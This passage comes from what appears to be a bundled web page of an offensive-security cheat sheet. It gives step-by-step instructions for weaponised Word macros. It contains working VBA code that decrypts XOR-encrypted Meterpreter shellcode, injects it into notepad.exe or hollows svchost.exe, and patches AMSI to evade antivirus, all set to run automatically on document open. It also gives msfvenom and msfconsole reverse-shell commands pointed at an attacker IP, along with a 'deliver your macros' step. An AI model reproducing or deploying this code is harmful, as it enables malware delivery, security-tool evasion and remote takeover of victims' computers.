243, 38, 25, 181, 184, 18, 45, 49, 168, 54, 234, 120, 96, 237, 57, 16, 121, 181, 228, 249, 12, 90, 40, 187, _\n76, 237, 96, 230, 73, 153, 80, 240, 212, 167, 174, 61, 121, 161, 89, 208, 13, 146, 98, 77, 128, 93, 28, 20, 13, 134, 57, 187, 32, 66, 96, 227, 30, 237, 109, 123, 243, 62, 125, 49, 171, 237, 101, 187, 121, 182, 232, 116, 92, 66, 58, 107, 25, 63, 59, 97, 135, 134, 57, 111, 34, 237, 115, 217, 248, 153, 158, 207, 37, 14, 82, 2, 120, 102, 9, 71, 11, 84, 62, 100, _\n16, 42, 22, 22, 127, 239, 137, 207, 168, 222, 241, 49, 120, 102, 72, 244, 44, 54, 9, 25, 248, 13, 97, 207, 173, 12, 107, 88, 184, 206, 76, 239, 16, 100, 97, 49, 195, 239, 135, 96, 40, 54, 49, 112, 40, 38, 49, 88, 146, 105, 190, 208, 135, 179, 246, 90, 104, 48, 54, 88, 225, 195, 21, 81, 135, 179, 228, 240, 12, 108, 158, 126, 112, 19, 141, 216, 31, 102, 97, 48, _\n18, 102, 11, 52, 46, 49, 9, 50, 161, 174, 62, 207, 173, 229, 153, 48, 6, 80, 234, 6, 18, 38, 9, 48, 104, 102, 97, 102, 18, 102, 9, 104, 220, 53, 132, 207, 173, 245, 50, 90, 120, 48, 50, 103, 16, 100, 184, 248, 39, 153, 180, 179, 128, 102, 28, 24, 32, 14, 97, 112, 120, 102, 11, 48, 40, 14, 106, 31, 119, 86, 158, 229, 47, 14, 20, 94, 53, 7, 158, 229, _\n38, 56, 158, 60, 92, 105, 228, 64, 135, 153, 158, 217, 227, 153, 158, 207, 121, 165, 72, 246, 13, 167, 162, 139, 152, 123, 75, 58, 16, 192, 244, 141, 229, 153, 180, 12, 126, 26, 107, 176, 131, 134, 20, 53, 195, 33, 114, 66, 23, 12, 97, 99, 135, 179)\n\n    Dim scSize As Long\n    scSize = UBound(sc)\n    \' Decrypt shellcode\n    Dim keyArrayTemp() As Byte\n    keyArrayTemp = key\n\n    i = 0\n    For x = 0 To UBound(sc)\n        sc(x) = sc(x) Xor keyArrayTemp(i)\n        i = (i + 2) Mod (Len(key) * 2)\n    Next x\n\n    \' TODO set the SIZE here (use a size > to the shellcode size)\n    Dim buf(685) As Byte\n    For y = 0 To UBound(sc)\n        buf(y) = sc(y)\n    Next y\n\n    \'grab handle to target, which has to be running if this macro is opened from word\n    Shell "notepad.exe", vbHide\n    pid = getPID("notepad.exe")\n    Handle = OpenProcess(&H1F0FFF, False, pid)\n\n    \'MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE\n    addr = VirtualAllocEx(Handle, 0, UBound(buf), &H3000, &H40)\n    \'byte-by-byte to attempt sneaking our shellcode past AV hooks\n    For counter = LBound(buf) To UBound(buf)\n        binData = buf(counter)\n        Address = addr + counter\n        res = WriteProcessMemory(Handle, Address, binData, 1, 0&)\n        Next counter\n    thread = CreateRemoteThread(Handle, 0, 0, addr, 0, 0, 0)\nEnd Function\nSub patch(StrFile As String, Is64 As Boolean)\n    Dim lib As LongPtr\n    Dim Func_addr As LongPtr\n    Dim temp As LongPtr\n    lib = getmod(StrFile)\n    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off\n    temp = VirtPro(ByVal Func_addr, 32, 64, 0)\n    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")\n    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")\n    temp = VirtPro(ByVal Func_addr, 32, old, 0)\n    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off\n    temp = VirtPro(ByVal Func_addr, 32, 64, old)\n    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")\n    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")\n    temp = VirtPro(ByVal Func_addr, 32, old, 0)\nEnd Sub\nFunction getPID(injProc As String) As LongPtr\n    Dim objServices As Object, objProcessSet As Object, Process As Object\n\n    Set objServices = GetObject("winmgmts:\\\\.\\root\\CIMV2")\n    Set objProcessSet = objServices.ExecQuery("SELECT ProcessID, name FROM Win32_Process WHERE name = """ & injProc & """", , 48)\n    For Each Process In objProcessSet\n        getPID = Process.processID\n    Next\nEnd Function\nSub test()\n    mymacro\nEnd Sub\nSub Document_Open()\n    test\nEnd Sub\nSub AutoOpen()\n    test\nEnd Sub\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Start your Metasploit listener"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Deliver your Macros"}),"\xa0and wait for execution and your reverse shell"]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"process-hollow---meterpreter-encrypted",children:(0,t.jsx)(n.strong,{children:"Process Hollow - Meterpreter Encrypted"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Create your shellcode"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# If you change the key, then change it in the vba code too\nmsfvenom -p windows/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'CHANGEMYKEY'\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Create a new file Macros"}),"\xa0and insert your shellcode from step above and save the file as a\xa0",(0,t.jsx)(n.code,{children:".docm"}),", in this case it will inject into\xa0",(0,t.jsx)(n.code,{children:"notepad.exe"}),"\xa0but you can change this"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-csharp",children:'#If Win64 Then\n    Private Declare PtrSafe Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long\n    Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr\n    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long\n    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long\n    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long\n    Private Declare PtrSafe Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)\n    Private Declare PtrSafe Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr\n    Private Declare PtrSafe Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr\n    Private Declare PtrSafe Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long\n    Private Declare PtrSafe Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long\n#Else\n    Private Declare Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long\n    Private Declare Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr\n    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long\n    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long\n    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long\n    Private Declare Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)\n    Private Declare Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr\n    Private Declare Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr\n    Private Declare Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long\n    Private Declare Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long\n#End If\n\nPrivate Type PROCESS_BASIC_INFORMATION\n    Reserved1 As LongPtr\n    PebAddress As LongPtr\n    Reserved2 As LongPtr\n    Reserved3 As LongPtr\n    UniquePid As LongPtr\n    MoreReserved As LongPtr\nEnd Type\n\nPrivate Type STARTUPINFOA\n    cb As Long\n    lpReserved As String\n    lpDesktop As String\n    lpTitle As String\n    dwX As Long\n    dwY As Long\n    dwXSize As Long\n    dwYSize As Long\n    dwXCountChars As Long\n    dwYCountChars As Long\n    dwFillAttribute As Long\n    dwFlags As Long\n    wShowWindow As Integer\n    cbReserved2 As Integer\n    lpReserved2 As String\n    hStdInput As LongPtr\n    hStdOutput As LongPtr\n    hStdError As LongPtr\nEnd Type\n\nPrivate Type PROCESS_INFORMATION\n    hProcess As LongPtr\n    hThread As LongPtr\n    dwProcessId As Long\n    dwThreadId As Long\nEnd Type\n\nSub Document_Open()\n    hollow\nEnd Sub\n\nSub AutoOpen()\n    hollow\nEnd Sub\n\n\' Performs process hollowing to run shellcode in svchost.exe\nFunction hollow()\n    Dim si As STARTUPINFOA\n    RtlZeroMemory si, Len(si)\n    si.cb = Len(si)\n    si.dwFlags = &H100\n    Dim pi As PROCESS_INFORMATION\n    Dim procOutput As LongPtr\n    \' Start svchost.exe in a suspended state\n    procOutput = CreateProcessA(vbNullString, "C:\\\\Windows\\\\System32\\\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)\n\n    Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION\n    Dim ProcInfo As LongPtr\n    ProcInfo = pi.hProcess\n    Dim PEBinfo As LongPtr\n\n#If Win64 Then\n    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 48, 0)\n    PEBinfo = ProcBasicInfo.PebAddress + 16\n    Dim AddrBuf(7) As Byte\n#Else\n    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 24, 0)\n    PEBinfo = ProcBasicInfo.PebAddress + 8\n    Dim AddrBuf(3) As Byte\n#End if\n\n    Dim tmp As Long\n    tmp = 0\n#If Win64 Then\n    \' Read 8 bytes of PEB to obtain base address of svchost in AddrBuf\n    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)\n    svcHostBase = AddrBuf(7) * (2 ^ 56)\n    svcHostBase = svcHostBase + AddrBuf(6) * (2 ^ 48)\n    svcHostBase = svcHostBase + AddrBuf(5) * (2 ^ 40)\n    svcHostBase = svcHostBase + AddrBuf(4) * (2 ^ 32)\n    svcHostBase = svcHostBase + AddrBuf(3) * (2 ^ 24)\n    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)\n    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)\n    svcHostBase = svcHostBase + AddrBuf(0)\n#Else\n    \' Read 4 bytes of PEB to obtain base address of svchost in AddrBuf\n    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 4, tmp)\n    svcHostBase = AddrBuf(3) * (2 ^ 24)\n    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)\n    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)\n    svcHostBase = svcHostBase + AddrBuf(0)\n#End if\n\n    Dim data(512) As Byte\n    \' Read more data from PEB so e_lfanew offset can be retrieved\n    readOutput2 = ReadProcessMemory(ProcInfo, svcHostBase, data(0), 512, tmp)\n\n    \' Read e_lfanew offset value and add 40\n    Dim e_lfanew_offset As Long\n    e_lfanew_offset = data(60)\n\n    Dim opthdr As Long\n    opthdr = e_lfanew_offset + 40\n\n    \' Construct relative virtual address for svchost\'s entry point\n    Dim entrypoint_rva As Long\n    entrypoint_rva = data(opthdr + 3) * (2 ^ 24)\n    entrypoint_rva = entrypoint_rva + data(opthdr + 2) * (2 ^ 16)\n    entrypoint_rva = entrypoint_rva + data(opthdr + 1) * (2 ^ 8)\n    entrypoint_rva = entrypoint_rva + data(opthdr)\n\n    Dim addressOfEntryPoint As LongPtr\n    \' Add base address of svchost with the entry point RVA to get the start of the buffer to overwrite with shellcode\n    addressOfEntryPoint = entrypoint_rva + svcHostBase\n\n    \' Buffer for malicious crypted shellcode needs to go here\n    Dim sc As Variant\n    Dim key As String\n    \' TODO change the key\n    key = "CHANGEMYKEY"\n\n\' msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key \'CHANGEMYKEY\'\nsc = Array(145,145,252,...,180)\n\n    Dim scSize As Long\n    scSize = UBound(sc)\n    \' Decrypt shellcode\n    Dim keyArrayTemp() As Byte\n    keyArrayTemp = key\n\n    i = 0\n    For x = 0 To UBound(sc)\n        sc(x) = sc(x) Xor keyArrayTemp(i)\n        i = (i + 2) Mod (Len(key) * 2)\n    Next x\n\n    \' TODO set the SIZE here (use a size > to the shellcode size)\n    Dim buf(685) As Byte\n    For y = 0 To UBound(sc)\n        buf(y) = sc(y)\n    Next y\n\n    \' Write the shellcode into the svchost.exe entry point\n    a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)\n    \' Resume svchost.exe process to run the shellcode\n    b = ResumeThread(pi.hThread)\n\nEnd Function\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Start your Metasploit listener"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Deliver your Macros"}),"\xa0and wait for execution and your reverse shell"]}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453(e,n,r){r.d(n,{R:()=>i,x:()=>a});var s=r(6540);const t={},o=s.createContext(t);function i(e){const n=s.useContext(o);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);